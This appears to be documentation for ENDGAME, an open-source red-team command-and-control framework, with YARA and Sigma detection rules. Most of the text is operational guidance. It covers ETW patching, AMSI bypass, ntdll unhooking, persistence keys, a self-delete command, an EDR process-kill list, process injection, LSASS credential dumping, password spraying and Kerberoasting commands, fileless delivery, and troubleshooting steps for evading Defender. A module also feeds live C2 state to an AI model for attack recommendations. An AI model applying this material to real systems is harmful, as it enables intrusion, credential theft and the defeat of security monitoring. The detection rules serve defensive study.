ETW Blind ntdll!EtwEventWrite 48 31 C0 C3 (xor rax,rax; ret) Scan first 4 bytes of EtwEventWrite at runtime
AMSI Bypass AmsiScanBuffer VEH hardware breakpoint via DR0 register; no byte patch Monitor debug register DR0 for AmsiScanBuffer VA
NTDLL Unhook ntdll.dll full map Remaps clean copy from disk; 0 EDR hooks removed on healthy system Detect double ntdll.dll mapping in process address space
ETW Process NtSetInformationProcess ProcessEnableReadWriteVmLogging = 0 (disables process-level ETW) Monitor NtSetInformationProcess class 0x58
Sleep Mask Agent heap / stack Ekko — XOR encrypt + ROP chain sleep; memory appears non-executable during sleep Scan for non-image executable memory regions containing PE headers

File Paths (default config)

RunHKCU\Software\Microsoft\Windows\CurrentVersion\Run\<task_name>
SchedHKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\
Self-delete Pattern
cmdping -n 3 127.0.0.1 >nul & del /F /Q "%s"
Scheduled Task (PERSIST_TASK default)
Taskendgame_updater (configurable)
DisplayName set to randomized string via DisplayName=rand

Behavioral Indicators

EDR / AV Process Enumeration (sandbox detection)

The agent enumerates running processes at startup looking for these process names. Their presence triggers sandbox abort or evasion mode changes.

falcon-sensor.exe sentinelagent.exe sentinelservicehost.exe elastic-agent.exe bdservicehost.exe csfalconcontainer.exe msmpeng.exe mssense.exe csagent.exe cortex.exe cbdefense.exe carboncblack.exe taniumclient.exe taniumendpointindex.exe sophoscleanm.exe sophosfileintegrity.exe sophosui.exe malwarebytes.exe darktrace.exe ampdaemon.exe procmon.exe procexp.exe procmon64.exe procexp64.exe wireshark.exe fiddler.exe ollydbg.exe x64dbg.exe idaq64.exe windbg.exe
Process & Injection Behavior
PPIDSpawns with explorer.exe as parent (default PPID spoof)
InjectVirtualAllocEx + WriteProcessMemory + CreateRemoteThread into target PID
APCEarly-bird APC into sacrificial svchost.exe
ThreadThread-hijack (SuspendThread + SetThreadContext + ResumeThread)
ClipOpenClipboard + GetClipboardData (CLIP_GET command)
LSASSOpenProcess(PROCESS_VM_READ) on lsass.exe for credential dump
WFPWindows Filtering Platform rule addition to block EDR telemetry (EDR_SILENCE)

YARA Detection Rule

/*
 * YARA rule for ENDGAME C2 agent (default, non-Garble build)
 * Author: threat-intel@endgame-c2
 * Confidence: HIGH for non-obfuscated build · MEDIUM for Garble build
 */

rule ENDGAME_C2_Agent {
    meta:
        description = "Detects ENDGAME C2 agent binary (default build)"
        author      = "ENDGAME Threat Intel"
        date        = "2026-07-05"
        hash_sha256 = "6344e02c74f75eece74fed0773de6e27a7ab86b6bbafd68b7027754f696ec986"
        hash_garble = "cb3a0f15b20564f9b2b224b2cc77edf4bacab65113bd6ed86f0fb39001e52dc1"

    strings:
        // C2 operational strings present in default build
        $s1 = "[+] thread-hijack:"          ascii wide
        $s2 = "[+] BOF '"                    ascii wide
        $s3 = "[+] HTTP pivot listening on :" ascii wide
        $s4 = "[+] registry Run key: HKCU"   ascii wide
        $s5 = "screenshot saved:"            ascii wide
        $s6 = "EVASION_I9"                   ascii wide

        // Default PPID spoof target
        $p1 = "C:\Windows\System32\svchost.exe" ascii wide

        // ETW patch signature (xor rax,rax; ret at EtwEventWrite)
        $etw = { 48 31 C0 C3 }

        // Named pipe for SMB C2
        $pipe = "\\.\\pipe\svcctl" ascii wide

        // Amazon malleable profile fingerprint
        $ua = "rv:11.0) like Gecko" ascii wide
        $uri_get  = "/s/ref=nb_sb_noss_1/167-3294888" ascii
        $uri_post = "/N4215/adj/amzn.us.sr.aps"       ascii

    condition:
        uint16(0) == 0x5A4D           // MZ header
        and uint32(uint32(0x3C)) == 0x4550  // PE signature
        and filesize > 6MB and filesize < 10MB
        and (
            (4 of ($s*))
            or ($etw and 2 of ($s*))
            or ($uri_get and $uri_post and $ua)
            or ($pipe and 2 of ($s*))
        )
}

Sigma Behavioral Detection Rules

---
# Sigma rule: ENDGAME C2 — ETW patch detection via memory scan
title: ENDGAME C2 ETW Blind Patch
status: experimental
description: Detects runtime patch of ntdll!EtwEventWrite (xor rax,rax; ret) used by ENDGAME C2 agent
references:
  - https://github.com/redteam/endgame-c2
author: ENDGAME Threat Intel
date: 2026/07/05
logsource:
    category: process_tampering
    product: windows
detection:
    selection:
        Type: PatchImage
        TargetImage|endswith: '
tdll.dll'
        PatchSize: 4
    condition: selection
falsepositives:
  - Known red team tools with ETW bypass
level: high
tags:
  - attack.defense_evasion
  - attack.t1562.006  # Impair Defenses: Indicator Blocking
---
# Sigma rule: ENDGAME C2 — PPID spoofing + process injection
title: ENDGAME C2 PPID Spoof and Remote Thread Injection
status: experimental
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        ParentImage|endswith: '\explorer.exe'
        Image|endswith:
          - '\svchost.exe'
          - 'gent.exe'
        CommandLine|contains:
          - '-NonInteractive'
    filter_legit:
        ParentCommandLine|contains: 'explorer.exe /factory'
    condition: selection and not filter_legit
level: medium
tags:
  - attack.defense_evasion
  - attack.t1055.001  # Process Injection: Dynamic-link Library Injection
  - attack.t1134.004  # Access Token Manipulation: Parent PID Spoofing
---
# Sigma rule: ENDGAME C2 — named pipe SMB C2 channel
title: ENDGAME C2 SMB Named Pipe
status: experimental
logsource:
    category: pipe_created
    product: windows
detection:
    selection:
        PipeName|endswith: '\svcctl'
        Image|endswith:
          - 'gent.exe'
          - '\svchost.exe'
    condition: selection
level: high
tags:
  - attack.command_and_control
  - attack.t1071.001  # Application Layer Protocol: Web Protocols
  - attack.t1021.002  # SMB/Windows Admin Shares
Compliance

Legal & Ethics

ENDGAME C2 is published as an open source professional security tool. The following documents govern its use, contribution, and responsible disclosure.

⚖
MIT License

Permissive open source license. Free to use, modify, and distribute with attribution. No warranty provided.

View on GitHub →
🛡
Ethical Use Policy

Permitted and prohibited uses, professional standards references, and liability disclaimer. Authorized engagements only.

View on GitHub →
🔒
Security Policy

How to report vulnerabilities in ENDGAME itself. Coordinated disclosure, response timelines, and researcher credit policy.

View on GitHub →
🤝
Contributing

Code style, PR guidelines, issue reporting, and what contributions are accepted or declined.

View on GitHub →
Legal Notice
This software is intended solely for authorized security testing, penetration testing, red team engagements, educational purposes, and controlled lab environments. Use against systems without explicit written authorization is illegal. By using ENDGAME you agree to the Ethical Use Policy.
AI Integration

AI Assistant

ENDGAME incluye un módulo de IA integrado que puede conectarse a Ollama (local, sin dependencias de API) o a la API de Anthropic Claude. El asistente puede operar en modo conversacional libre o en modo Pentest con contexto C2 inyectado automáticamente.

🤖
Modo Chat

Conversación libre con el modelo. Útil para redactar comandos, analizar output de herramientas, generar scripts o hacer preguntas técnicas sobre el engagement.

🎯
Modo Pentest

Inyecta automáticamente el estado actual del C2: agentes activos, hostnames, usuarios, IPs, tasks recientes. La IA responde con recomendaciones contextuales al engagement en curso.

⊙
Contexto C2

El botón Contexto C2 captura un snapshot del estado del servidor (agentes, listeners, loot) y lo añade como contexto al siguiente mensaje. Permite análisis de campaña instantáneo.

🦙
Ollama / Claude

Conéctate a un servidor Ollama local (http://localhost:11434) con cualquier modelo (llama3, mistral, codestral…) o usa la API de Claude con tu API key para máxima calidad de respuesta.

bash
# Instalar Ollama + modelo recomendado
curl -fsSL https://ollama.ai/install.sh | sh
ollama pull llama3

# O usar Claude API (introducir API key en la UI)
# Proveedor: Claude · Modelo: claude-opus-4-8 · API Key: sk-ant-...
Operator Tooling

Operator Terminal

El Operator Terminal es una shell local integrada en la GUI que ejecuta comandos directamente en la máquina del operador (Kali). Permite lanzar herramientas de post-explotación, análisis y movimiento lateral sin salir de la interfaz del C2. Incluye sugerencias de comandos para las herramientas más comunes.

Nota
Los comandos corren en la máquina Kali del operador, no en el agente. Para ejecutar comandos en el agente usa la consola del agente (pestaña Agents → Console). El prefijo ! fuerza ejecución directa en shell sin procesar.
🧪
certipy-ad

Enumeración y abuso de PKI de Active Directory. Encuentra plantillas de certificados vulnerables (ESC1-ESC8).

🐕
BloodHound

Recolección de datos de AD con bloodhound-python y análisis de paths de ataque al Domain Admin.

🔗
nxc / CrackMapExec

Enumeración SMB, spraying de credenciales, ejecución remota, dump de SAM/LSASS en múltiples hosts.

⚙
impacket

Suite completa: secretsdump, GetUserSPNs (Kerberoasting), wmiexec, psexec, GetNPUsers (AS-REP).

🔑
kerbrute

Enumeración de usuarios y password spraying contra Kerberos sin generar eventos de autenticación NTLM.

🔍
nmap

Escaneo de red y detección de servicios. Integrado con historial de comandos y output mostrado en terminal.

operator terminal
# Ejemplos reales del Operator Terminal
certipy-ad find -u localuser@cs.org -p pass -dc-ip 10.2.20.100 -vulnerable
bloodhound-python -u user -p pass -d cs.org -ns 10.2.20.100 -dc WIN2022-SRV-X64.cs.org -c All --zip
nxc smb 10.2.20.0/24 -u user -p pass
impacket-secretsdump cs.org/user:pass@10.2.20.100
impacket-GetUserSPNs cs.org/user:pass -dc-ip 10.2.20.100 -request
kerbrute userenum -d cs.org --dc 10.2.20.100 users.txt
Support

Troubleshooting

Common issues encountered during setup and operations, with root cause and fix.

Connection & Beacon
Agent built and executed on target but no check-in appears in the GUI

Likely cause: C2_HOST was set to the wrong IP at build time, or port 8080 is blocked by the target's firewall.

Verify the compiled-in host:

shell
strings bin/agent.exe | grep -E '10\.|192\.|http'

Check that the HTTP listener is reachable from the target:

shell
# From the target (or a pivot host on the same segment)
curl -s -o /dev/null -w "%{http_code}" http://10.2.20.200:8080/
# Expected: 200 or 404 — anything other than connection refused means listener is up

If the listener is unreachable, check the server is running (make start) and that no host firewall is blocking port 8080.

GUI shows "unauthorized" — Process List, Task submission, or API calls fail

Cause: The browser cached an old GUI token. The token is regenerated every time the server restarts. Your JavaScript has the stale value in memory.

Fix: Reload the page. The token is re-injected into window.__GUI_TOKEN__ on every full page load. Do not copy the token from the URL bar or from a cached script — always let the page inject it fresh.

shell
# Confirm the current token programmatically
curl -s http://127.0.0.1:8888/ | grep -o "__GUI_TOKEN__[^']*'[^']*'" | grep -o "'[^']*'$"
Agent checks in once then disappears — never beacons again

Likely cause: The agent process was killed by Windows Defender or another AV. Check that EVASION=true and AMSI_METHOD=veh were set at build time.

endgame — operator console · evasion_status · etw_blind=true · amsi_bypass=veh · sleep_mask=ekko

If Defender is flagging the binary, rebuild with a different sleep mask (SLEEP_MASK=noaccess) or reduce the sleep interval to make the beacon less regular.

Build & Installation
make agent-exe fails with "CGO_ENABLED" or cross-compiler error

Cause: The MinGW cross-compiler for Windows is missing.

shell
# Install the missing cross-compiler
sudo apt-get install -y gcc-mingw-w64-x86-64

# Or run the full deps target
make deps
make agent-mtls fails with "certificate not found" or TLS error on check-in

Cause: mTLS certificates haven't been generated yet, or the agent was built before make certs was run.

shell
# Generate certs first (one-time, creates certs/ directory)
make certs

# Then rebuild the mTLS agent — certs are embedded at compile time
make agent-mtls C2_HOST=10.2.20.200

If you regenerate certs after agents are deployed, all existing mTLS agents will stop checking in — they have the old CA embedded.

Server starts but GUI is not accessible at port 8888

Cause: The client binary (c2-client) failed to start, or a previous instance is still running on that port.

shell
# Check if port is in use
ss -tlnp | grep 8888

# Check client log for errors
tail -50 /tmp/c2-client.log

# Stop all instances and restart
make stop
make start
Post-Exploitation
INJECT_REMOTE crashes the target process or kills the agent

Cause: You are injecting the agent PE (agent.exe) directly as the shellcode payload. A PE file is not position-independent code — injecting it into a remote process will immediately crash that process.

Fix: Always use the shellcode blob (agent.bin) as the injection payload. Generate it with:

shell
# Convert PE to PIC shellcode via go-donut
make agent-raw
# Shellcode output: bin/agent.bin
# Use THIS file as the INJECT_REMOTE / INJECT_APC payload, not agent.exe
INJECT_APC returns "[+] APC queued (async)" immediately with no further output

Cause: This is expected behavior. APC injection spawns a sacrificial process and queues shellcode before its first thread runs. The agent does not block waiting for the injected code — it returns after 10 seconds regardless. The injected payload runs independently.

If you injected a new agent beacon, wait one full sleep interval (e.g. 60s) for it to appear in the GUI.

MINIDUMP task succeeds but the agent dies or stops responding afterwards

Cause: LSASS dumps are typically 150–250 MB. Uploading the dump over the C2 channel requires buffering the entire file in the agent's memory, which can exhaust the process address space and cause the agent to crash or become unstable.

Mitigations:

  • Run MINIDUMP alone — never batch it with other memory-intensive tasks in the same queue
  • Use a BOF-based dump alternative (e.g. nanodump) which writes the dump to disk first, then exfiltrate with DOWNLOAD
  • Increase sleep after the dump to give the agent time to recover: submit SLEEP {"sec":5,"jitter":0} before MINIDUMP
STEAL_TOKEN returns "unknown task type"

Cause: You are running an older agent binary that only handled the TOKEN_STEAL task type. The GUI sends STEAL_TOKEN.

Fix: Rebuild the agent from the current source. The dispatcher now handles both names as aliases:

go
// commands.go — both names map to the same handler
case "TOKEN_STEAL", "STEAL_TOKEN":

If rebuilding is not possible, submit the task manually with the old name via the API using "type":"TOKEN_STEAL".

Lateral Movement & Credentials
netexec / impacket returns STATUS_LOGON_FAILURE with valid credentials

Cause A: You are using --local-auth with a domain account. This flag forces authentication against the local SAM database, which fails for accounts that only exist in the domain context.

shell
# WRONG — --local-auth fails for domain accounts
netexec smb 10.2.20.100 -u localuser -p password --local-auth

# CORRECT — omit --local-auth for domain context
netexec smb 10.2.20.100 -u localuser -p password

Cause B: The machine was rebooted or restored from snapshot. NT hashes captured from a previous session are invalid — the machine account password or local account credentials may have changed.

Fix: Re-dump credentials from the live session using MINIDUMP or a BOF such as nanodump.

WinRM execution fails with "Access Denied" or connection refused

Cause: WinRM is not enabled on the target, or the account does not have remote management rights.

endgame — internal pentest · check credential access · SMB / WinRM / RDP / MSSQL / SSH

The account must be a member of Remote Management Users or Administrators. Standard domain users cannot use WinRM by default.

PORT_SCAN task never returns a result

Likely cause: A previous task (commonly MINIDUMP) destabilized the agent before the port scan was dispatched. The agent accepted the task but crashed before completing it.

Fix: Check agent status — if no other tasks are returning results, the agent is dead. Deploy a fresh beacon and run PORT_SCAN as a standalone task without other heavy operations queued ahead of it.

endgame — network scan · verify host reachability before agent operations
Evasion & AV/EDR
HOOK_CHECK shows functions as [HOOKED] after ntdll unhook ran at startup

Cause: Some EDR drivers re-hook functions after the initial unhook, typically on the next call to a monitored API. This is a "re-hook on call" defensive technique.

Options:

  • Use direct syscalls (Hell's Gate is compiled into the agent) — these bypass user-mode hooks entirely by invoking syscalls directly
  • Run EDR_SILENCE to block EDR network callbacks, reducing its ability to update hook state
  • Switch to AMSI_METHOD=veh (default) which does not modify any function bytes and is invisible to hook scanners
Agent binary is flagged on disk before execution

Cause: Static signatures in the Go binary (import table, strings, PE headers).

Options to reduce static detection:

  • Convert to shellcode with make agent-raw and inject via an existing foothold rather than dropping the PE to disk
  • Use the UPLOAD task to push the binary directly to memory via an existing agent, never touching the filesystem
  • Stage delivery via PowerShell IEX cradle (fileless execution)
  • Use the /api/encode endpoint to apply an obfuscation layer to the payload before delivery
